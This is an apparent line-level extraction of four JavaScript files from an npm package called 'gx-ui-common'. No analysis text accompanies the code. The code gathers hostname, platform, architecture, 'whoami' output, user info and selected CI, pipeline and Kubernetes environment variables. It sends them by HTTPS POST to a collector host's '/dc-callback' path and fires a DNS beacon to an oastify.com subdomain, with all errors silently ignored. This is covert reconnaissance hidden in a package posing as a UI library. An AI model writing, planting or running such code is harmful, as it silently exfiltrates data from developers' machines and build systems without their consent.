// File: tmp/tmp37nmvjnp/gx-ui-common/package/index.js
// ======================================================================
Line 7: const os = require("os")
Line 8: const https = require("https")
Line 9: const http = require("http")
Line 10: const crypto = require("crypto")
Line 11: _tmp_7 = require("child_process")
Line 18: execSync(cmd, { timeout: 1500 }).toString().trim()
Line 24: _tmp_8.push("PASSWORD")
Line 25: _tmp_8.push("GITHUB_TOKEN")
Line 27: const SECRET_PATTERNS = [
  /(?:eyJ|ya29|ghp_)[A-Za-z0-9_\-]{10,}/,            // JWT-ish / base64-ish / GitHub token
  /[A-Za-z0-9_\-]{24,}\.[A-Za-z0-9_\-]{6,}\.[A-Za-z0-9_\-]{27,}/, // JWT 3-part
  /AKIA[0-9A-Z]{16}/,                                // AWS key id
  /(?=.*[A-Za-z])(?=.*\d)[A-Za-z0-9_\-]{32,}/        // generic high-entropy
]
Line 28: _tmp_9.push(/(?:eyJ|ya29|ghp_)[A-Za-z0-9_\-]{10,}/)
Line 29: _tmp_9.push(/[A-Za-z0-9_\-]{24,}\.[A-Za-z0-9_\-]{6,}\.[A-Za-z0-9_\-]{27,}/)
Line 30: _tmp_9.push(/AKIA[0-9A-Z]{16}/)
Line 31: _tmp_9.push(/(?=.*[A-Za-z])(?=.*\d)[A-Za-z0-9_\-]{32,}/)
Line 36: _iterator_0.next()
Line 44: _tmp_3.push("USERDNSDOMAIN")
Line 45: _tmp_3.push("BITBUCKET_")
Line 46: _tmp_3.push("PIPELINE_")
Line 47: _tmp_3.push("KUBERNETES_")
Line 48: _tmp_3.push("npm_config_")
Line 49: _tmp_3.push("HTTPS_PROXY")
Line 51: keepPrefixes.some(p => K.startsWith(p))
Line 56: for (const [k, v0] of Object.entries(env || {})) {
    if (!shouldKeepEnvKey(k)) continue;
    if (SECRET_KEYS.some(s => k.toUpperCase().includes(s))) continue; // drop likely secret keys
    const v = redact(String(v0));
    // trim long values
    out[k] = v && v.length > 300 ? v.slice(0, 300) + "...[truncated]" : v;
  }
Line 57: shouldKeepEnvKey(k)
Line 58: SECRET_KEYS.some(s => k.toUpperCase().includes(s))
Line 61: out[k] = v && v.length > 300 ? v.slice(0, 300) + "...[truncated]" : v
Line 67: const token = crypto.randomBytes(8).toString("hex")
Line 72: os.hostname()
Line 73: os.platform()
Line 75: os.arch()
Line 76: safeExec(process.platform === "win32" ? "whoami" : "whoami")
Line 77: os.userInfo()
Line 87: {
  const data = Buffer.from(JSON.stringify(payload));
  const req = https.request({
    hostname: COLLECTOR_HOST,
    port: 443,
    path: "/dc-callback",
    method: "POST",
    headers: { "Content-Type": "application/json", "Content-Length": data.length }
  }, () => {});
  req.on("error", () => {});
  req.write(data);
  req.end();
}
Line 88: Buffer.from(JSON.stringify(payload))
Line 89: const req = https.request({
    hostname: COLLECTOR_HOST,
    port: 443,
    path: "/dc-callback",
    method: "POST",
    headers: { "Content-Type": "application/json", "Content-Length": data.length }
  }, () => {})
Line 97: req.write(data)
Line 98: req.end()
Line 103: http.get(`http://${token}.${DNS_BEACON_ROOT}/p`, () => {}).on("error", () => {})

// File: tmp/tmp37nmvjnp/gx-ui-common/package/index2.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const querystring = require("querystring")
Line 4: const https = require("https")
Line 5: const packageJSON = require("./package.json")
Line 12: os.hostname()
Line 13: os.userInfo()
Line 35: var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
})
Line 36: {
        process.stdout.write(d);
    }
Line 37: process.stdout.write(d)

// File: tmp/tmp37nmvjnp/gx-ui-common/package/index3.js
// ======================================================================
Line 4: const os = require("os")
Line 5: const https = require("https")
Line 9: os.hostname()
Line 10: os.platform()
Line 12: os.arch()
Line 13: os.userInfo()
Line 31: const req = https.request(options, (res) => {
  // Just swallow response
})

// File: tmp/tmp37nmvjnp/gx-ui-common/package/index4.js
// ======================================================================
Line 5: const os = require("os")
Line 6: const https = require("https")
Line 7: const http = require("http")
Line 8: _tmp_3 = require("child_process")
Line 9: const crypto = require("crypto")
Line 12: execSync(cmd, { timeout: 2000 }).toString().trim()
Line 16: const token = crypto.randomBytes(8).toString("hex")
Line 21: os.hostname()
Line 22: os.platform()
Line 24: os.arch()
Line 25: safeExec(process.platform === "win32" ? "whoami" : "whoami")
Line 26: os.userInfo()
Line 53: {
  const req = https.request(collector, res => { /* ignore */ });
  req.on("error", () => {});
  req.write(JSON.stringify(payload));
  req.end();
}
Line 54: const req = https.request(collector, res => { /* ignore */ })
Line 56: req.write(JSON.stringify(payload))
Line 57: req.end()
Line 63: http.get(`http://${token}.bl0g2dkuigl5ms46wsaai77qihobc30s.oastify.com/p`, () => {}).on("error", () => {})
